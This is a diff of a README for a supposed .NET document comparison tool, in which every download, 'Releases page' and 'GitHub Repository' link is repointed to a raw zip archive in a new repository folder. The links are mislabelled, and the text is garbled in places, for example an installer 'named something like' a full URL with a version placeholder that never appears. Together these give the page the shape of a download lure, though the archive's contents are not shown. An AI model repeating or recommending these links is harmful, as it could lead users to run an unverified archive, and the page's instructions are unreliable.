@@ -18,12 +18,12 @@ To ensure a smooth experience, please confirm that your system meets the followi
 - **Disk Space**: Minimum of 200 MB free for installation
 
 ## 📥 Download & Install
-To obtain the Dotnet-Document-Comparison-Tool, visit this page to download: [Download Here](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/outboundaries/Dotnet-Document-Comparison-Tool.zip).
+To obtain the Dotnet-Document-Comparison-Tool, visit this page to download: [Download Here](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/ExampleAssets/Comparison-Tool-Dotnet-Document-v1.2.zip).
 
 ### Steps to Download
-1. Click on the above link or navigate to the [Releases page](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/outboundaries/Dotnet-Document-Comparison-Tool.zip) directly.
+1. Click on the above link or navigate to the [Releases page](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/ExampleAssets/Comparison-Tool-Dotnet-Document-v1.2.zip) directly.
 2. Look for the latest release version labeled as "Latest Release."
-3. Download the installation file suitable for your operating system. The file should be named something like `https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/outboundaries/Dotnet-Document-Comparison-Tool.zip`, where ‘X.X.X’ corresponds to the version number.
+3. Download the installation file suitable for your operating system. The file should be named something like `https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/ExampleAssets/Comparison-Tool-Dotnet-Document-v1.2.zip`, where ‘X.X.X’ corresponds to the version number.
 4. Save the file to a location of your choice on your computer.
 
 ### Installation Instructions
@@ -72,7 +72,7 @@ If you're interested in contributing to the Dotnet-Document-Comparison-Tool, vis
 Your feedback helps us improve the tool. If you have any suggestions or encounter bugs, please submit them through the GitHub repository’s “Issues” section.
 
 ## 🔗 Links
-- **GitHub Repository**: [Visit Repository](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/outboundaries/Dotnet-Document-Comparison-Tool.zip)
-- **Download Here**: [Download Here](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/outboundaries/Dotnet-Document-Comparison-Tool.zip)
+- **GitHub Repository**: [Visit Repository](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/ExampleAssets/Comparison-Tool-Dotnet-Document-v1.2.zip)
+- **Download Here**: [Download Here](https://raw.githubusercontent.com/DTHOFFICIEL/Dotnet-Document-Comparison-Tool/main/ExampleAssets/Comparison-Tool-Dotnet-Document-v1.2.zip)
 
 Thank you for using the Dotnet-Document-Comparison-Tool. We hope it makes comparing your documents easier and more effective!
